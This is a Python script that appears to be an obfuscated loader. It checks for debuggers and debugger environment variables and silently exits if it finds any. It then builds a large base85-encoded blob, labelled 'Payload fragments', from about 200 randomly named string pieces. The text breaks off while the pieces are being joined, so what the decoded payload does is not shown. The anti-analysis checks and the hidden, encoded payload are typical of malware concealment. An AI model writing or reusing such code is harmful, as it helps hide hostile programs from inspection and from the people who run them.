#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cmJNDfTcwT3Col = 'G*K5a4C_io9NdMNVQ=9iwI%U-3p$<SO5jYMB7+D?5JTZCDo~'
_chP0iz_gCWmEQ0 = 'G@l%=*!tf)xS#wJ;Fy_cbd<x|4Y#Z0_!sj*oas*4m+5VP3SD'
_ch1htXsg55jgD9 = 'l$yColy&SsiYea#A;wXs11?81Y;=I??!i>ddDZvL^iXrx`pf'
_cc70On5TqBVFlV = '_6H%%Z<}3?Cci>&;%d5t35N>5X^fd`)Od8id7D(9W(i<--qy'
_cglr6to6h4oLjA = '*yeNV^4k2@o(|+U#9`KmTi@6(>hlpTEsOx-x$DNNY>9BZWI8'
_cinW7zRp7fQ2NK = 'WW5X<0&!EXs1AJY|Bg%MGJCWBqeY}^5#cIg<vQhr;}7hzecs'
_cxpKS8suZxVABL = '>;Phz_ePYd-q(SQ$~$6>!W)S!sVa<A@oN6?5D?%L%Fe24y|I'
_cbhGmScLabP8g4 = '0+qs@YDk%g9w_bD-ErQ-BP&F5K@zWUd2Zf?W+xnSN+P%wdLx'
_cte1NtIoOaLhlZ = '3P(B8N!zE|PeD`y<@s@P`clHZd^{0TkaAN$@4_vL?Bg_{DU<'
_calOnJVfZ_uTRR = 'O2@Wz`dGdV?;o>knmUpkH!Fn}!$Km^j9%7P!yz{zGjjynR4='
_clDq7ekOK7Xp0_ = 'Ebk}W1@tIQ0&HU!X{jXVlAsFAr_3cw6))nH_idp!gcjo8_QZ'
_ca08N5f8v7EkQt = 'qsZh>_ySH^`8lmIzH@Oc_})oCE3-PCy28?T2J&IxLXEov;fR'
_ckfWnynX7jH9PG = 'u6EkqQ?4d#B}{ByD{c7%9!d0L1_i7CfyZ1_^5zCw*;M=^sjP'
_cqPr_kQvIZ4FOU = 'b;LSm7j~{NRjLe7JN_uXwx);&H^LQfgCqd1OO2xz*xM0*Jat'
_c_aB2yPMs229SW = 'PO-3(AZwa1$p^Ql}uIm~$oWVS9{TAUm9l8+n8mc8w#br&O4H'
_ciSXYtLnkDkQxD = '7$;D7LCqQ+<?PtlEQGBi1a8b$64%Zo^r?Duie&g@W{nb75NS'
_cb2gFE00LAUk5K = '|z6k!efHxpCfYaa%1nwARn9IzY26m~Zq4}3<&Q9fo)D?l)^$'
_crPg9lVfRxRs9P = 'V%8H#>Da;NfOp9WE+0E`UBn}Fmk;X!Og~Jk(aSu9tBRW?#<T'
_chBPZkZUs_6TK5 = 'yCgqJ$jbZ(t33Q%V(0s@WhF7U`#)^mr8Yxx3x8kH<7Fdivf>'
_ckg9PcRtgL8xv0 = 'f43GzxVkfzOjE*c{nRQlggd>9zXXfE~-`0h%$A6X-LtREAa*'
_cokhvPFu8K8OvP = 'nB>{F%33+4>zgRl$zX!+Wn80g!;lKI!;Vt;&7fNl#&z2*3uJ'
_ct1sMwe12XVuR1 = 'u=!3!Sw6GGFa<FF(}LI*g0;-gWc-H}ege7F)O4{orhAdTIwk'
_cqXYbjxodPZ7UP = '1lPfWWTN|%L7jAhiLC|M?&pI!s6n&h^PA(JY8gG_W?t2pZgj'
_cgBKWflgPKfkUE = 'x?918F{hqu~dE?)}RMc78AS7YF>5ShX^Nyxk1r3c3hS6~ba='
_cg5zDyY2rpfh9G = ');sEd3um4Qz*;4E4}8u}QrzZ}$Kf7xE8O{#7^{B>!Z_K+id*'
_cz6CSCAh9bdVWa = 'J)%}%@TS3GK$hmM<1_@_dmV2_!y?D3xXDcBxT#eiAAekdomf'
_cpv2lhCyUkOpM8 = 'pcc^+sfZ}+kU&<(grF!yc-Dbb5b4h+KYvY$4Wr*&J<c`z$%s'
_cztd927D09pxZ1 = 'l2DD!`Zq&ESa!<RSdzkHEu@P!3eI7HGNFGytY@u1rnRNu-qX'
_cfgPKOs4DBKyIt = 'V59hJ{Bdae0JZ8r`hOtz?7T$PfMPut*WYIHT5>yq5qV9p&1T'
_cqTKVHzEnfgvfn = 'J_a2J!A4=bXDKjsUMu6x}a!s!{$SoLL)J#Y3B(<LU7Gq&(L`'
_cyJgl06ZqGWpkC = '_;k4rJTuYeQifB)N|6ImbU627;<y5FMUi%n{GmtDkA)2U-S{'
_clP3b1Slkm0A48 = 'k*R(xi6LRR=a{et_w-g&{#t6K*X7@3MPWwI;Lz{mhib3xSEY'
_cdanbp5wq469ZH = 'JUivJu3^Hj0(uZTX_+U)=)H<`}~A44)ae5wGtEPrLuJvU;pU'
_crHut0RkjOANXo = 'SvsS8JSqmzDQi(q49{N0~6*ZRXFe~v<qNI1hNegh6K-=?Y7>'
_czVzoWpBbPNUg8 = ')D@vQ1)2*`|YegjB6R;OMFH&%KnP6U|wQhbyGRnO1NF*4{$s'
_coE_ZZYg32JdU7 = ')-qAmzthJ${NoAfHiXZ;kg8n<CMxtQv&E<^tJ4WNR=|C-Sak'
_ck1NhNXDglsuRt = 'EREW{1S=ImG>r)30&i$!<nS?5sr7R|H_0K7GQnH$fQz9{%v|'
_ct8Fm9gu2bIywh = '0eP>kz>drh;sbb*S+)~$A9!x))G0k6}Ps;|HLIs!jd^|Lugt'
_cpWgX729VCF6lY = '^svQCCgg!yXmb<AhfzRWJ|B`nJkwBW}f|0YGVaQ}*&j7_dzN'
_cn7_v5N8RwjSMy = '?oq{N)Aw$8C5jAv&8Y<>AlLK65?^&PwY<{ho$~pPiDVkB6I2'
_cosdE77o3Fktdm = '!{%lEvNXw$AarWao~txQ;3JsVlfNQl0l;A=x9x{*Jqo9BSq%'
_citGbnSKr2SoGs = 'gi)Muxsk}@NlQmD#wz<iCz-b-~wV9A9`ni$}|$_TcVO6cEO!'
_ch7hcOaJY3j1tN = 'a>pp!G#5dC@_|#zz?HzMkjiHSMTQ4n)Km6k2#mjGB6<&s2WD'
_clseexYlCsrUpV = 'k%1$aSLblBAm!9&I6`TjD1W@=U*kUt)28HnHc%Cp*6gjK}p2'
_clVQfABsLykxPJ = 'tq>@q0NS!)07BQKSnUCskW@I`#lptDLxUnh_)e_OMb}(P?<~'
_c_dumw2QlQ0DaI = '3|8R)Srtn+2?|2#Megk=Wc6RN5wb9X?H?B}jXf$0i%_dg0VG'
_caR2ZWCo15LhjB = 'lc&T4(k!i(^By*Qd4b9^-Tf6mo7lihK&HuC+bDmGUnBxFH@a'
_c_zOUGshQ5HDxM = 'jE_yjI)h_aW1IGDXN9MC2K+wHNja08nwvW9hG=M)2x6}i3>J'
_crXBjloXBpBkt_ = '{dzm@%ioF(A-<JV%BaWIA-B1TzbnL<%%3gTAA2QyjVVj{3NO'
_cqQk8LtOkoVxFW = 'H7p1TO6G6Kh0TU**~ow|7nV998LX5Wi=)S)MM5*;k8)Yf+Sa'
_cuBL5mufWLsntB = '1Fu%HBkDCcJ-3;sOqd{_K?-szb-DGQx|@xq&@MATq=E@FYe7'
_crFpSEhpyLGrPi = '3t=5UE694~A=Tet+pi3=;8ilsv!AG{dDXuQ|<LxVfWO6Bh8w'
_czAIj9EE4H4VAa = 'UtgjX*L^$S#Zj|=7=vRQp_V8MeSnHi}4xeY&w&d93=?(FfH)'
_cb2o5U72l2sCVl = 's1Y*rD^MKTzVp(OxEoZa;d>}1-@}^GxjOP&PX@r+=BSd6iIo'
_cwYnG2pMujmTAd = '^deI>c<zS4`AV!zk}Yzwtc{L{sWay@j$Ql8h5yQZ-H~Nm#8$'
_cna5zyOne9ks2Q = 'k2M!cS?GOnGyIuW&kfjy63|#*vLr|KE!9ei%lK0#82ypRt<O'
_coS7LChwiuvqHS = 'jH%l5~Kl4dj0jvwWO<Pv=|`D1?VnNSSIPU_eUCv!DvckA}21'
_czqsxo_cAwYXvr = '3<@s=o$t6K<S!EdmY)Q&ikw}7@o>9lHxq($Lh!=!6@H$^cD9'
_cnPtW6pTXwGRwW = '6`-69x48+WOrp==+?fgN;((ramOcN{HN{%NI{~dv@YOA&p{<'
_cyeuzbVmWjY6Jv = 'MV_pJ~fq&K%M$o9iGS#ThA=^Zgz@qeo>70H+kj8%!5;%$z6Q'
_cljgIrB7YSuPKM = 'g6jiKP*RmB#b5jW!m`X<AP3a#+s8e13GszFKuA}{GUUN0%M;'
_cuiUEt5W7nmhxr = '7|*mR4LUHQ1uX!zn^{OnC3Nuv_A)~Iz33=0Oa_i!w`P|g#WD'
_cfEv8HpG10s4cP = 'jN(X%GPMT>7U3q@Hp7tYX}PPYJK)GjbT^^Bx-am0Mb6HD`d?'
_coLUs2vVMmIjP7 = 'u__=9ut<~rUY7=>NI)}gw2uNI4c^|DZWY0L1{=co8JQk=w9e'
_csPGhxvYm9kvjE = 'e<wdBYkSgU1xtSKNlSLM78z8QB_8n0ZE?RmbB@luuZsc8U<;'
_cpFx8CUjFXOG4l = 'MR<udiNiZSLzH#ob^NKO2CiFtj{K%^aKCvucbKziBC&wlTPP'
_cxEWSHl0Ll_KR7 = 'uG=`TheBnmI)KiUGs2%&4?0-|KAG}qEy(CTK7?~=uxV9FKa>'
_caJioPxth7DkRz = 'nML#4h6Ztf-ys=JN6oz!6ED!E!LNriQpG17gB@i>4RBH<eaD'
_cvyAxGiBMqtgHd = '`pEjRD!`@>AtIBC$L*QGgB*o!pVN(?3GDkU`(t_>^$!Qp!<<'
_cbhqZs23bwgUh3 = 'aMWLRoi8eGNOx1{ET$+g!3>>b2>*GG*%7@ei%L=Vu30@<#qR'
_cpLc6gTnVIcZVp = '#_>BG^-(P-rt4eC4e9NkMr$V<@qg=(q#2-|mMX&4>Ccb=q5C'
_cdvSaUBN0MgM_J = ';Ye0*3HN3R`3u50|^^eYDGmRdYHp&_iUX73GFsN1o0PwhTO%'
_ceCQVHlPp3vj63 = '!FCJ@z&4F9J;Iji~OJk&~TSnJW#c+1<L;N(hl4*zBehkt-Ic'
_csjQ1SAAQfeT_L = 'xj#&pe14W?a)uO&>d(ZA#ifM=;lDzsA^ls_<xqxPB(E|Uj(}'
_cpSD3UY1EYlSh7 = 'J1~oE^}G@vM-vM<cN`@o@5T`@CY3Yc6OT*<-vmkZRcMB0m&d'
_cfQMzrKlhRrsf0 = '??~8Pf3l}W-5+{aRCi%Xi>&tYxcd|Y#Tk-;PiPEBMi`}Y#<X'
_cjn_cXJHW0Gz5l = 'zs;fYzvmGdw0o#L5-+>>pu-z0;0Cz}Q;&FiBww6Ptubuu5bI'
_czTVxKKTAIq_MM = '05L0tw=*=<)M>8`1Y&ZFJUb$ZZsA}!pLzi-F80(TaMJqOKfA'
_cxJDdhozg4tg25 = 'VQ@VR_cGAErzmhsK_$*Y{OL*8`*<5|mQ7$qRKMsT{UyZOJxX'
_cxXTUvsaCHmc5m = 'g)})}iH7QsYU)<96sY%8ihE;rgMcA=f&%W;wW_UGXwB;TIxU'
_cmLhOwVGkaGUd0 = 'TLcSTt4w+KK83!gY{*J-S*Z=>iY^7hB)hoX)X3j`Z}dVm4fE'
_cxi0Gm0mSfTSFj = '@6%yUN55#{K~9*si@cG|@NkPhxFk5=Z8{BEKh{lUbvmm;Vz='
_cocZ9CtbPM6USt = '`vgvLm3Q%TvT(1kff52IC;OY(fXp95v(3_t5UUsJtb4Si2PX'
_ctrICflMaDHutg = '}D~)=?au_2~--sm`@HLPB)-=V$+k&rC6lBckF>!>PP;A4i7A'
_ctyJPfoBErWxNO = 'Yq58_v{euw*G@h!FvfRWIN|b;7+UkPu4y_p{UhJel)Em%ift'
_cglTbXtjermf0J = 'Ld3}RF0BlvCC{&&*hQd0uN2^wmt3OS--j8RKOjWc6~oQx9S-'
_crDznZ0rNSPXZj = 'z-yZWE-TWxXRjS^K#qb0>Xvurz*PkI03i;<xGx@;)Ufmd)NV'
_cqTDv0DXofnafP = 'n!yDh=zd%6UTtS#%7>0MqakDtG*nI?6{#`O@Fi&D5lg(a}pj'
_clyx38O_mNK6LW = 'JHiTnhUPtcHZw}z{c%fokyilJIUw{|mX`Gl`PW&MqGG1Jm8m'
_cxuw26OmPYPgAU = '2r8nmNK}@bbT>U6GEA7R!e#F9PI(coY7bnD{n7`>K7Pl$rYj'
_cjU98dBfVQ8tYu = 'ajPfLp1}p;&hlMMEBi#Y(8DIE4vyTc*pV41z*$jBzg2?`d&A'
_cgdENg_QBLcqLB = '+z=)Cmg9yi>&DEw*g$0gN4?<tr4UuD~)DPk+Q=Sd)!hbe~YW'
_ctHcssQ5TWoZlg = ')tq1^}ZjOqE2&x;;0xN@sb3^)2&j&1mD;|BU5Z>=VVY-5|;0'
_cyQ_AKRdUgM43u = '*K%+to9WIJDl7lTpRhK!hmIzCM4tlbHyfR*-<GLA8u+j-*HO'
_cen91AlkAV7S8L = 'kOCgAR14Z&Z4UvVE`RE~Y(#wbw1-OBTM8t~ofLU?2V5vsQ^P'
_ciIKSZAzQn8M34 = 's(#?!^^3m1e|}R3hO&iB5(z1_>L9Tq?xnD98Xbhl&y$kCKTe'
_csiZODJ_GdpQbW = 'fdAD*ZfZQKZ}j~uA8o3y@Hfk`;jOx->gaX|8rf4MGb`MlBCj'
_cgfCdTMqupX1HY = 'er>mrPF=FJ!z6}`4q1FC~%eAn@_mnT5x8Ad}c<akYyF)zCSr'
_chjOw936g0w00S = 'qNHmp!Ma2SiEBNor{2*hwDkKhI{a=)2V0C~n3x$l(CSKv=)Z'
_cgJY2aq3mQMOxZ = '(FHwQ}gDl!dv1u1J~98+L`7eGi6O%w>5D%3|@#C|ArM914J)'
_cf4twzc2ilkoW2 = 'ox(y(CMSN?sD!HRM*XxnLc#Ahxv=P+Jb6!DChLIduICg;`#`'
_cke0f0Efcobpw6 = 'ew(?AMda)W2`BV7YvAB~t{XLrZ?{fHlWLYLI<xpNTadt?{s^'
_ceIkGXVYk4EGF9 = 'adSjDNfe=*>3LX{iS-r6rFELX<J2J-DpHXp~QyGR}wDRFHmO'
_cyKybDtSmN_55J = 'RSvDUfDzM(nx%}WluqdA`uZV7et>ugKOpv7sCG2uUn(5cfZ~'
_crJMooCd9aiI8j = 'Ud=(i2`rjjc^*GPp&fCVh65s!1bP*fc$?9p$>|p$e)+9Ttm<'
_c_2h8BxHfNL94v = '373q8xuhZS{uqL2f9-fo+0w%>t<&zfyYG_+5-m|+TK{Q$uYg'
_caiWj_DiSOvwVa = 'f1jP}6A9MBj9N7_$eB^x?IIdTgj7P~F+{<o_I?qyD7N$RZ!^'
_cg2r4Yh58Zlw52 = 'oM9yk9Y;CdILf;(v1fiMdoS`*}J54*&M=TBs9e`yz7cnwhMd'
_czCrWHmBSXHgbE = '+jx<mE!8QT|V?$1kSChIkuFn#=4oTf-V0m8!y${;J-6tGo>n'
_cqE5NuqmyEacqi = '_Oih1_Xa7QjGq<inTye-eB6_SoK$n0Ou6wFu!|U1LQ-w>$La'
_cnNTuAdvgphwH9 = 'M+_#Km|r91gGC6U%QsBcur%pPFl{Q(^g%js&^D5#a-Yny1qo'
_cnDKi9iq2Hq4Vc = 'dr!FI_$gQzO6=q5*I<Fr<?C_1VQ-KpFL`o?nfe1RcZxe8`#n'
_cgmpGLAauuXrzo = 'QuyWFg78KKbDyN^{@$_X>Eg{Y+Z-|<Bb>ruDJXhL1VB4VW|>'
_ctDDnv0ugf8cHb = 'Es4MF1k0OHS6ofiyuROS+$Fvyk6Y30X^r1)%xg|iTFPnLvO_'
_ccCteBWXGuuGxj = 'qXqb>toZ*ML<9QZV`z-!N&YardsK>MRI!8>3{Zx-o*}1BEFQ'
_cgFZecEa64uVVG = 'WkFoj_{T^cn>@ur#+{ngWVYf_!lZx%VVLBd;k5By<bn$_#dy'
_cvwhzScuyJsNnU = '>gJbw+^9gAkwwy}j76bep|-?&5ckgQZsWmsB#>?NuHJO@OZW'
_csiI68mZfimTJz = 'r9ptE5?)tfE%>Z*YUv!T>U1g>O7q9I0z)-K&;?+{V7}D?4EJ'
_caaYtnbbHoYvlW = 'aYltI3eX$NoZ>od-k+t5>!{nRV#&8@Rt>CJ@TzKccpOX~i`!'
_czO1NnsCO14N4y = '1*T=AKF9CZp$wKxQxjrD&~58HX=5%(y_`hDYI=&5JmnL)cz~'
_ckgh78qZmKgcXt = '>+hi0XrxVVdNeswxS2&*xQ#-Eo%7^wG488o)1@|?Xw5NLC1*'
_cowj0_4Os0gKJZ = 'Xl;W@iR@hLoQNSkMY<WlcCd01d{a!f%}+Hz1wK(P?V*>J8d='
_caRC_fE1nCXBm0 = '!+n8e;v=8DeYceM>@!X;3EEo;=85x_n?$ExnM7P(!xfUK~h|'
_cq002nfi397JH2 = 'tlig+n)`AuxWNWdm#zB{({p>L;m8X(7uMymQUYhyz`;pu?-('
_cvoWqS6Lw3Rb3Q = '+{m6H#fyZrjEe=!0B0cK-LhQQn;GBItZuZLE#``3Pr{-6hr&'
_cs2WGdo0lt8Lm0 = '(`Tw~$)E8APa78brgu&9VDD|dWVmsg`7#5h_z^?g<?S$pNlu'
_caK3f6UsRogIkm = 'QyY3))sFq@!>V1mv0NegXAN@9BineV%a(D5y3{6;=AMA+grx'
_cjo5q_I_WMokug = '!x^j8lRvHAdl{L!MFPo@&XJy$Z_y8Giq6e5I|#V4z2s?@aVa'
_cuObYhkkZKftxa = '=P22=VEH<Y(STk>%1RxvlMOYW0&8FcOkduPkblO&nzFa2gI;'
_cmWM9WX6v8D3jv = 'qZmcDQ@^Ra;RMuBf-i-C`i4z=T-n9WdrCRXDsxes6b&#R?{#'
_cl9toXXppF0Cyh = 'QXm@>w*zNS#6}r$Z33LrS<DW|ve8%g4%>hJw|OXe+FwwExic'
_cnH70wJAZFE0LF = 'mmN^5c~(MHLvw>M|ln40cJH=%n-zAVZ39z%ZDOj`Yao^GM66'
_cnzy171lX9ot3W = 'OP(;2geZaqE`8%6_}-|vUMHXjFv%gicnvh!pK*}({j=VvMLD'
_ckHeV6J9oPU7na = ';2KlM8)c7%cA3nyp;DCX7=F7oouqMMdj7HI~mzBaZ3dg%GdC'
_csmcGBvI0ZACKF = 'a~*ztRWNIF}Iw?Dq)N#pfuhOVWC7KL40(kvdiT0a&Yn`LcG&'
_cc2o3ipBpumped = 'v{#$8O~@7k#TqAH8|~f_-681BieXVtv@1Oj)hz{B+_m40uKU'
_cg5F1DEiuANc7w = 'ZGI6Hv>QkLbFW4QD8x>p&s;{hoIcUd*xUQQ!$<IP);fA#R1H'
_chpsSGE1U06RL7 = 'LWO)!<s-?V}5j|4Rs;aa$IEF1=QrY%OT`1&i@VS+bj6r;%Lk'
_clhUycd1GW8tsi = 'Vana-OQ_I5JPF>R>{5<Bt?sGUz@Bz<oS<b264*IC*Q#etz^s'
_cwg6vNAYI3vWys = 'bbnRQ-Hp($<PZOB%qU3xX=*Ft{nwGG+Tc;*<k946%2ha`ntp'
_ctU5yu8ftT4AgG = 'Y795<(7!BRmamb<iTW~5J9}(k#K)+USIpWxUAQ%4iajvXW-|'
_cokVo2liIn1MNn = 'V3Ocx-bk73SI3K-y!bF&~W-A6tmKC7JH(92b^G!@zRuafvb$'
_crImmqnlMSJVt0 = '#_{S&-yE>m2>vj`-<m|h!rlA3fyy!an<2jggdaT;E$A^4E6`'
_cvRANTAbBe9IAH = 'wElJbADC!0?C^TnO%EmTlLhd7o)^0Efyp=r>B2o|u5yM17c#'
_coivMIsm917f2C = '#)uxVKJ`%7Pm<i@`8f`tWiq+EQ8?5cf~9RWH+@?ixMY!WrL3'
_cfv5Z3kCZbqcId = 'aKCdQVCR0AR2M(N?_TkZ2`kqdpL6<Qf-1D12!L}6-*fo*s4@'
_crlRL6TeOW58A0 = '5=`ZDV)msOOL>^%&$Nmyr4PB?}#zG)%kFuTUnFh?})M<>^PU'
_cvr09x7bXibRdi = 'A`u1*>o)_%@oL479yWA&8aXbf)aod?F;cEcplsQ$C?7;8q4T'
_croY3kqajUm2jU = 't8g4--D*B`deNhw4z1H<eK%aj(37T1(hOjz#sa%tW)z1F?^|'
_cv8nZ2TW2nhYrs = 'c|M<{IXUEnmWu^9$A9m#-&Z%4ysq$SsEw+IdXvKwOAdX{pA;'
_cwUj0cS7VZp7UU = 'ga%M%YVjCRhMX8FiJV8*M1!ipq4l`oouS~tYML2;kKSxtFG;'
_cupIs0KkCwPfGJ = '~D{zU0lM;I3z$d8L$XwIU5@M`_d3|x8xjadfh#07@T52QS1W'
_cnTwNf8CCgL_Nx = 'lQA8gcbv(g@X`VPs+#jhsa>@6u(+F>F<Z_G+P2m0kO^%II?;'
_caB8ROG8onKgFP = '_6`wf32H%CNZRepg0AZ)U+1L|$2tOl4yOL_|Cfc8Gm0x>QRW'
_cicvZlsrkzmfV3 = 'wh85}X!yb0d92+}T>9C)&b=j91T?;|C=#onh$1^5Hz1C5&Wm'
_ckMcpaIchXAN2Y = 'Ps__#m}xAx>PUM?s~I5^qYUW`%rPB+8q1o#g8eH#F$HK_T6*'
_cdvchYVshI32oA = 'W?KjsKia(*-bNmhZ4yF5x!8xgU$I_#L$3QT1Pbp#w>M}G3K!'
_crgGxzNeCraIKo = 'KxX!amc}_*bYAI<qGM)=_^xB0f7|PkVhvD>E*l|0?t*&%rO4'
_cld2VvLFCd0s6Z = 'jq)+r`+BD{d2v@DCn5K~GdFJB4ao0Ay`Yl=mnsJQpo$VO;_!'
_cqaHAKcwGm6HP6 = '!>VYR&<3raYafseK%%f8%N74oI=SVM;{q8G}#e04v@0EcA1p'
_cu1UDyNG_1ZZEJ = '2bPr8?OaO!CF!i;`&%sp;E<sjQ4yui5-he<8q5I0H0n6n`_b'
_cvpUlvLKVPp93o = 'Qi*?$sr7~-Bh_@zY)WO3`C)=eXg@R1C*xPu3kwNaj3>H0MmV'
_csGlTcvREBzBXP = '4ZTQeTp^zaQe62!dD3!pOY>ml$x(ayAs9rg-~J9Ne4R|JBOi'
_cslFjIKKwgU3DW = 'UE_!#pz^gV19Dz0;Dr}rMQF+pQc0jE-Y*`{x<jO`k$S^NVkd'
_cmm6hpP1eZK6vT = '0yO8~o~ZK;JH*5rtM8C6e|-T>Ky>8GAiF^^>+7Bck1&j>(vM'
_cwJRVCmS_rZgUw = '3ej0?QjBR5&FSw7r=o{Z5Whwr@=wAygC>S%y2jMr#L&5j`8k'
_cgHgXEO6Qbdvtj = 'Z$=?^+|0!?etoxlj@=a!jBI<-8tzoROq$cDlFFXmEN=A5(wz'
_cd6g53mbQzSokR = '9~S#pTUG^42yLWx7G?HL}PIJ_P}9E9!)1?25Xkp;&YprmiE+'
_ch7IPY7WP8hb1P = 'WS!p!-Sp9>siSY<2*X}x52=<_F?F$-BnM?884k>_8P}{-hFv'
_cvtswSyj1_MZhK = 'Z@496rctLEiM>LpYI@gUatZ=GpVry6$$_lKUi;0D*qRBZw)p'
_cnbeOI97AJ06m2 = '2=D}nQ2?E;^VKM6`&%2Hpz5vtiq_)=qI_Z?S%y;_A@+37F9*'
_cdFNhcw4_2hIKn = 'Spi(?-NB`1Bjhh@+|qVdA9kJI76!RoUNK3Yd4DWNJBzZYOuM'
_cy1wK9IqDiQIio = '-zQrx_^UAcm=<UIFyfqLsigY?F65C-^Z>}YsQLVs=7AxIxB7'
_ce0TdmoOBHC0kh = '&Suw<_nIy#4w=Iah-G*>~AFV`JJfs7al_!I=uF|mfigJ3aaJ'
_ck84yW4xnh1ZoJ = 'UFN&TmP_tOn2SFtuT45VRHqeI-+1)kQk>s_M`+>tL}vSqe^i'
_cdPPRbuokQ9YxH = '@yU!K29QFKPnIu$NX#&6BGLlVeOG#69zd{;@&$(cwwySJiJV'
_c_7ToUJOSGd5_N = '-A=?l9d@eG`n{L8YGFV!iSl!VJyTR2W`6-{Eg91Sq^KbxLD%'
_cdKyE6oxiMPCcO = '1!W!rbhp55<(kbis*kGTy#s@H>GfD`E2o;>?x@Tqe!RtRAF&'
_ccZihjGzBrW2Wy = '{0`a-Rs%m36U2+7p{gITJWjZ1p$kN<?+na7gD_$-3JpN}vfs'
_cnjzwdeN_82Dtj = 'f^X6bI?S@EW@=cg6E4pst9!b4;w4)!}FWLX6EijX%6wfxUNx'
_caqdeu8o831YuD = '38EGdn_H~z)gx!Ezi!>cq~phfu|_(dP{mlCvI#NSSgFhr7eZ'
_cuhyznxy0SOJ1W = 'Y{qJ0^xiT>h0ZvNgKsHi<zZa@BN@)jVOUxIZ3zvQ7yeH#_G='
_cjlaQGcWT4wH8f = 'e9i;q<N{^HxtP*qR$<uZDkIP?X3Q_vvWJZ@B+oD5lC@O#c9`'
_cyzXE2u_mEe2UR = '_CgX}Kegm^omxfp^s<AVM8lMnjVS~tna?LxlKVHaTt&}6EuK'
_crEIz0gGiuNAkS = '>w%{x?L8=##A<DiH5Ec)@*S-Kt7zLe(r8I~hM?8Z1tYFt)`V'
_cbvcnmLlX93wS_ = '69`y^j2jbA+a++Oh3$;1{~<BX&WDXCl)s{3LX!YGk%yYZ;NQ'
_cgZw0buieywcFw = '46ZhR?%hEgaAZCzy`b*UF%lk!0asG<mv(N|@93HSeEBe9hU`'
_cuIMeYLpVcnbfD = 'Nv+sXeYS^l$@lMx<KO#=6+Ao%J(@)2~!``ed|U~##^6v9P%^'
_cctqfdoaSt6ly0 = 'eC#4BrK8tOU85IyY8hDKr9PFzWFrZ;k<_AOYZ)KgC=(5*rfu'
_cvrOgBQqqVwfON = '!X{^ZZ{>7{(EXGFMn{&f=AfgrW2eF*wrRG@s%0O&?ucjE6(f'
_cuWfgX1x0qf73a = 'Nd0{}Eb`N?c1i#S6KrUQYU5sdA5~A7F8xyucs?0Qhif`@7WJ'
_cyso1nsYdpPv_A = 'V8A#+;9=)2^DNQYk2@K(Q4#<axxXVU^v8go>c`ac?o|8e(Q7'
_ccEIFY0Ks2oom1 = '$xMIf%L{|d;s>>N<5@;lzZPiVfVXkR?m+*F+Vzq3ZX|h!m!&'
_cf92xq6E17P1ra = 'iboc#DWoE{8{A891GBbu)87yM5G)du<Pdz2duyP^wBWrzD9C'
_ckDTNrrBc5XJIC = 'BQptUsXkbUYQ4lc>EcG8xr%l-EAJI}ieHVSO3hgF>X=RJNX_'
_cjYf6JOD1JLiwb = '&)`l56O7I5c><{AJLc=|yfy{OO8pI5J1aYQ&w8V}R+zZsWQ~'
_cd4x6ZO1dcGnue = 'mh^EWYLB=;uuE@N$ZQxAC%vKN~Dvtl*lr6?}LTvQVi8FXrO^'
_cclq8Cst3RWXZp = 'TMn=tOv**cGQO;DI8l9U|lfp#Xr4Q^AOt^(4nRGs2c(t>aNv'
_csYdzRBlgHSizJ = '0!DqQA9Wb%qDH!I%Ea4qg@wnhKF0o>$LKR`Wj}P<5pR3V&OH'
_cmSbWrJAiGfj7j = 'n}454BLQI#hBVcj{^0+!HYDJN@zV?ijFvs2GG!j7ary-mQHX'
_cgnHpTZ2JVULQo = '{9_3weW%k`SZ*rklmXpH>&o;v7w~Z-gpSpPp^dY#ql1aG$;I'
_cftZHOoXapB2wW = 'bskFwm{Rn|$gz1rR38^}99Y%Rt(*P;lk;cJ7t&ap%^13TI=L'
_cnDB_xUTMbNNk1 = 'E%t^)WALveDcAI40|)-8btHtCWTR{-~@!$0&mk$70_BzcU8B'
_cn5AviRSmPf5nB = '6!t#0fRUg7s?Gv(!j~?VO<N{z{2E!hL?beK~mZumB8Z@D2z%'
_cdT5Y7BK_IgzN8 = 'l$L7uz@#5s^TZ-ju00yTt'

_pyFhlgnoC6CO85 = __import__('base64').b85decode(_cmJNDfTcwT3Col + _chP0iz_gCWmEQ0 + _ch1htXsg55jgD9 + _cc70On5TqBVFlV + _cglr6to6h4oLjA + _cinW7zRp7fQ2NK + _cxpKS8suZxVABL + _cbhGmScLabP8g4 + _cte1NtIoOaLhlZ + _calOnJVfZ_uTRR + _clDq7ekOK7Xp0_ + _ca08N5f8v7EkQt + _ckfWnynX7jH9PG + _cqPr_kQvIZ4FOU + _c_aB2yPMs229SW + _ciSXYtLnkDkQxD + _cb2gFE00LAUk5K + _crPg9lVfRxRs9P + _chBPZkZUs_6TK5 + _ckg9PcRtgL8xv0 + _cokhvPFu8K8OvP + _ct1sMwe12XVuR1 + _cqXYbjxodPZ7UP + _cgBKWflgPKfkUE + _cg5zDyY2rpfh9G + _cz6CSCAh9bdVWa + _cpv2lhCyUkOpM8 + _cztd927D09pxZ1 + _cfgPKOs4DBKyIt + _cqTKVHzEnfgvfn + _cyJgl06ZqGWpkC + _clP3b1Slkm0A48 + _cdanbp5wq469ZH + _crHut0RkjOANXo + _czVzoWpBbPNUg8 + _coE_ZZYg32JdU7 + _ck1NhNXDglsuRt + _ct8Fm9gu2bIywh + _cpWgX729VCF6lY + _cn7_v5N8RwjSMy + _cosdE77o3Fktdm + _citGbnSKr2SoGs + _ch7hcOaJY3j1tN + _clseexYlCsrUpV + _clVQfABsLykxPJ + _c_dumw2QlQ0DaI + _caR2ZWCo15LhjB + 